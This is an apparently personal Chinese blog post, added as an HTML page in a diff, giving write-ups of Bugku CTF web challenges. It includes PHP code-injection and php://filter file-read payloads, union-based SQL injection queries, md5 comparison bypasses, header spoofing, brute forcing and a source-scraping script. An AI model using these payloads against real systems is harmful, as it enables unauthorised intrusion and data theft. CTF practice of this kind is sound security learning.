@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是半年前打的bugku的wp了，记录一下我的摸鱼之路 _(:з」∠)_">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bugku web wp">
+<meta property="og:url" content="http://yoursite.com/2019/01/31/bugku-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="这是半年前打的bugku的wp了，记录一下我的摸鱼之路 _(:з」∠)_">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/cfc8604403adada81bd5023bf8806cf9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/82eb3dd9df065c251c06916fdd8a1e2c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/02e5573c4a106b1d46586dd690573e35.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/7e5454ae397b5e05538f6be5a043578f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/7304488b2914e6457ae380b019443433.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/fb4091c6b9a744a5e8250d72b31c2512.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f1d4cdd4f330e7205350882e406afc25.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/6a151035e4425864707bb18b29042b1a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/a4ab58404b5ac1385fb78d2e645fce7d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/dd860fce546f4abe9690d786d43f0d72.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/fbf53f9d841a0231f630afe5ea213db0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/bfb7e8b2d55ecfa0c752edc32c126c5c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/25602826d6090357f7280b21139cf4cf.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/6b29eebe167d3344106fcbcc1984dbc1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/5f6d0efaa9e30a69c766db783891a0a9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/9c0ce87dc307eb69985e91d9320aa043.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/55f922826405fde0edcc6115b587aa2a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/1b50fa4a048862329b4ce64748046e6c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/560a8f837c462409b7a58933910c6da5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/8c6180492754adf853042eb5e4d08134.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/50d0ae15f9c9caae925ef87c19c3f818.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/5ee5032b8de062ab0ba35623899269fa.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/0e8106c212b66b62ea9e53f7928a062e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/5846139af7f5f58b637d5f7f6c0a4f84.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/8f0ba3d633d65fd8f803968cdf26b092.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/67678019cd055b8a98d58b203ddb327a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/aefda97a4bf382244253f507e2a7af57.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/a905b353e1ae3c03f415e3592510dea3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/0d61dd7045b068f0250c9be9e39c7bed.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/94dd926070e6260b6f1890a122a5d7c9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/9be19017240673d006645df5b312f593.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/771299696df9d971cbc14c02faf6134b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2759b736864f9c54c75ee407052d8675.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f368214adc87afae83f417ca71b3f577.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/0af1c2ba63e3a4227f0fe5816612b033.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/c8149ad376c3370a85ffac9998a5fde9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/67cd1a251433e3c2c3d1f76c7b096059.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/bfa027ac052d28b3627ea3f4c6117048.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/345cd0bd4d7cb33921791b3d854bf31e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/6a86a11133d910819871b97d82796ec6.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/02d7e1034e3a663eb9dd8a640f73952c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/580c3ded00996e7703e5d5f641fcc352.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2ab9f1356df7c4168f1206ce96a908bb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/8179087c8fd70b7a55003f12b23eafb3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/73e4c01f9e337e1dc3c4d49224c609a8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/9bacec987657c5c869a5ed2f8758abf3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/16ec8c0c097a4a16221049076c3b005a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/03386f7328b7b5fa8835411372645b70.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/036ea87116c474733804f5890c0e4b97.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f9033209e09804f4f01a72a33f9831df.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/ec3a608abee0eedb49f107411dac3dd3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/69a7d89569fe4e8b851d84ab4859e75a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/5c5837e3a64c26c358e8b8c819a5c14a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/69a7d89569fe4e8b851d84ab4859e75a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/99295ad25288678e6ab1c6ccc0eeec5e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/ed53afc136bae297e32b148b61ec2472.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/faea28a76e07622bdea0cfe53d878892.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/6cbb5592738381e3c5591c071fbd3a38.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/99596ce368d5f5f19fd13a5e755cc908.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/3a6f1f988a35c9dd10869e3a84d73150.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/b33ef257ffcb190b6559e605949342d0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2a6ab03c373796dc645f627ce97f3d96.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/4128efd4b359a6c6c21a1d684fc8b605.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/318a777fe0d31508317aaa7516a91252.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/378575a887742a61fbdc739fb7637570.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/3e55c2ae38bac14b0da3aee7dc1612d2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/e0ac9c53d3d47705e6e4163b7affe174.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/ae8f5a78214fcb9223bde35789006e0c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/9de907b726c6a3a53e871dacead87c87.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2768c41ef06dc8dc5e8a449d1542be2f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2a04e995fe599565a36ccf1841d82cce.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/56a248513b8eebc495a51d133a839330.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/70e57b8ffab51797145b9112bae8e7d0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/1b83e4dd93cddb113878c318b6220414.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/26f3da559fa06fcde09d37928f9a9590.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/8a543ba93d0959e0792199a80a9543dc.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/d7226761a08a56c6e278c21af88e4969.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f441a0c08602b0aff8221b2b9d23a060.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/369acf7a6187ed4c992ed133d7188170.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/2863ecfc76f8b927924ccd2514a40548.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/1ead8dc9018e4c9621cccf8f4e2c37a5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/8262360a06dba00fd63d73a4b6e9c189.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/6b4549da7e8ab5d2135b1fd5ccec97e2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/f77af8f172266d1fe439f7002061ea87.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/4508c753820543ff1aefdd2afde58c2d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/c8cfcc1334c7ff1f2b25880100014ba3.png">
+<meta property="og:updated_time" content="2019-02-03T06:41:57.190Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bugku web wp">
+<meta name="twitter:description" content="这是半年前打的bugku的wp了，记录一下我的摸鱼之路 _(:з」∠)_">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/bugku_web_wp/cfc8604403adada81bd5023bf8806cf9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/31/bugku-web-wp/">
+
+
+
+
+
+  <title>bugku web wp | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/31/bugku-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bugku web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-31T00:35:31+09:00">
+                2019-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这是半年前打的bugku的wp了，记录一下我的摸鱼之路 _(:з」∠)_</p>
+<a id="more"></a>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>摸鱼题，F12就是</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/cfc8604403adada81bd5023bf8806cf9.png" alt=""></p>
+<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>读代码可知在url后加?what=flag即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/82eb3dd9df065c251c06916fdd8a1e2c.png" alt=""></p>
+<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12，把maxlength改成2就行</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/02e5573c4a106b1d46586dd690573e35.png" alt=""></p>
+<h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>在hackbar里进行post what=flag即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/7e5454ae397b5e05538f6be5a043578f.png" alt=""></p>
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>审计代码，可知要利用php弱类型比较漏洞，在url后加入?num=1d</p>
+<p>当is_num()判断时会返回false，当与1进行比较时，num的值会被转成int类型即1</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/7304488b2914e6457ae380b019443433.png" alt=""></p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>截断加载停止浏览器刷新，然后F12可以找到一串html的编码，用python写脚本解码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/fb4091c6b9a744a5e8250d72b31c2512.png" alt=""></p>
+<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>在C:\Windows\System32\drivers\etc找到host文件，修改一下DNS就好</p>
+<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>进去后是个登录界面，于是尝试弱密码admin和123456</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/f1d4cdd4f330e7205350882e406afc25.png" alt=""></p>
+<p>提示IP被禁止于是想到用X-Forwarded-For，然后用burpsuit抓包</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/6a151035e4425864707bb18b29042b1a.png" alt=""></p>
+<p>抓包后发现有一串base64字符串，解码的得到test123</p>
+<p>于是尝试X-Forwarded-For：127.0.0.1且user=admin&amp;pass=test123，成功得到flag</p>
+<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面浏览器一直再刷新，于是打开burpsuit抓包<br>Go多几次后得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/a4ab58404b5ac1385fb78d2e645fce7d.png" alt=""></p>
+<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>$_REQUESE有get和post的作用<br>eval()可以执行代码<br>show_source()将文件高亮显示<br>var_dump()输出</p>
+<p>于是构造payload: <code>?hello=1);show_source(‘flag.php’);var_dump(</code> 绕出并读取flag.php得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/dd860fce546f4abe9690d786d43f0d72.png" alt=""></p>
+<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>审计代码，提示flag保存在某个变量中。同时由于要正则限制数据为{a-z,A-Z,0-9,_},于是不能同上题一样注入。但在var_dump()中有个可变变量，于是可以通过使用$GLOBAL变量得到所有变量</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/fbf53f9d841a0231f630afe5ea213db0.png" alt=""></p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>F12，发现有一大串字符被注释</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/bfb7e8b2d55ecfa0c752edc32c126c5c.png" alt=""></p>
+<p>搞了好久才知道是jother编码<br>于是放到chrome的console中回车得到flag</p>
+<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>既然题目叫头等舱，就用burpsuit获得http头<br>发现flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/25602826d6090357f7280b21139cf4cf.png" alt=""></p>
+<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>这个入坑咸鱼没实战过，就百度了一下wp学学大致的流程</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/6b29eebe167d3344106fcbcc1984dbc1.png" alt=""></p>
+<p>首先在url尾部加上index.php，网页存在，说明后台是由php写的<br>于是进行端口扫描，扫到有个shell入口</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/5f6d0efaa9e30a69c766db783891a0a9.png" alt=""></p>
+<p>最后burpsuie密码爆破，得到password为hack<br>输入hack得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/9c0ce87dc307eb69985e91d9320aa043.png" alt=""></p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>既然题目让看看源代码就F12看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/55f922826405fde0edcc6115b587aa2a.png" alt=""></p>
+<p>打开后发现js里有两串url编码的字符串<br>于是在python中进行解码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/1b50fa4a048862329b4ce64748046e6c.png" alt=""></p>
+<p>得到一个js函数，读一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/560a8f837c462409b7a58933910c6da5.png" alt=""></p>
+<p>易知将if()中的字符串输入提交即可获得flag</p>
+<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>这道题没什么思路，点click me?no后尝试将file后改成index.php然而什么都没有，用burpsuit也是，于是查了一下，发现要利用php伪协议<br>构造payload：<br>    <code>file=php://filter/read=convert.base64-encode/resource=index.php</code><br>用base64编码读取的原因是如果是正常的话就直接运行，而不会显示出来<br>于是得到一串base64编码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8c6180492754adf853042eb5e4d08134.png" alt=""></p>
+<p>用python进行解码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/50d0ae15f9c9caae925ef87c19c3f818.png" alt=""></p>
+<p>获得flag</p>
+<p>还有一点</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/5ee5032b8de062ab0ba35623899269fa.png" alt=""></p>
+<p>这题是因为include()这个函数才能用filter协议，一般情况下是不行的</p>
+<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>看题目就知道和js有关，F12获取js代码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/0e8106c212b66b62ea9e53f7928a062e.png" alt=""></p>
+<p>可以看到，当click&gt;=1000000时，会向服务端post一个clicks<br>于是我们直接用hackbar post一个click=10000001获得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/5846139af7f5f58b637d5f7f6c0a4f84.png" alt=""></p>
+<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>看到url里有个baopo，就试着打开burpsuit进行密码爆破</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8f0ba3d633d65fd8f803968cdf26b092.png" alt=""></p>
+<p>成功爆出密码，没想到是纯数字这么简单</p>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>看题目想着是应该要用到备份之类的，不过小白没了解过于是选择百度<br>然后得知备份文件以.bak结尾于是在url后加上index.php.bak获得了备份文件<br>打开进行审计</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/67678019cd055b8a98d58b203ddb327a.png" alt=""></p>
+<p>脚本是说获得url在?后的部分，然后将字符串中的key删去，最后获得key1和key2两个变量。然后进行md5()后比较，key1、key2不同但md5()后相同便得flag<br>删key可通过双写kekeyy绕过，但对字符串的要求不会弄，继续百度得知<br>有两种方法通过<br>①md5()不处理数组，若传入数组便返回NULL，于是构造：?kekeyy1[]=fafdsa&amp;kekeyy2[]=ndaslkdla<br>②当md5()出来的值是0e开头，则被认为是科学记数法，同时认为是0*10^n相等。使md5()结果为0e开头的字符串有：{QNKCDZO、240610708、s878926199a、s155964671a、s214587387a、s214587387a}，选用其中两个构造语句即可</p>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>一看就是sql注入题<br>尝试1’,发现没回显说明有注入点</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/aefda97a4bf382244253f507e2a7af57.png" alt=""></p>
+<p>于是开始注入<br>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1’ order by 4#</span><br><span class="line">-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</span><br><span class="line">-1&apos; union select 1,2,3,group_concat(skctf_flag) from fl4g#</span><br></pre></td></tr></table></figure>
+<h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>打开发现要求在2s内传值</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/a905b353e1ae3c03f415e3592510dea3.png" alt=""></p>
+<p>再刷新一下，发现是要post一个value</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/0d61dd7045b068f0250c9be9e39c7bed.png" alt=""></p>
+<p>解题方法很明确，编写一个python脚本获得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/94dd926070e6260b6f1890a122a5d7c9.png" alt=""></p>
+<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>看题目又是要写脚本，用burpsuit抓包发现flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/9be19017240673d006645df5b312f593.png" alt=""></p>
+<p>用试着base64解码了一下出来一段奇怪的字符串也不是flag很懵逼，搞了好久没出来于是百度</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/771299696df9d971cbc14c02faf6134b.png" alt=""></p>
+<p>发现原来是要解码两次，而且不能分次手工去解码，因为解出的字符串每次都不同，只能脚本抓，很难受</p>
+<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2759b736864f9c54c75ee407052d8675.png" alt=""></p>
+<p>看到filename的参数像base64就试着解码，解出来是keys.txt就试着输入index.php然而什么都没有，就试着改line的参数，发现line是按行返回，于是写脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">from base64 import * </span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">str1 = &apos;http://120.24.86.145:8002/web11/index.php?line=&apos;</span><br><span class="line">str2 = &apos;&amp;filename=aW5kZXgucGhw&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(30):</span><br><span class="line">	url = str1+str(i)+str2</span><br><span class="line">	http = requests.get(url)</span><br><span class="line">	con = http.content</span><br><span class="line">	f = open(&apos;index.php&apos;,&apos;a&apos;)</span><br><span class="line">	f.write(con) </span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
+<p>获得index.php源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/f368214adc87afae83f417ca71b3f577.png" alt=""></p>
+<p>审计代码，发现当cookie下margin的值为margin时，便能通过filename获取keys.php源码，于是修改下脚本</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/0af1c2ba63e3a4227f0fe5816612b033.png" alt=""></p>
+<p>获得keys.php源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/c8149ad376c3370a85ffac9998a5fde9.png" alt=""></p>
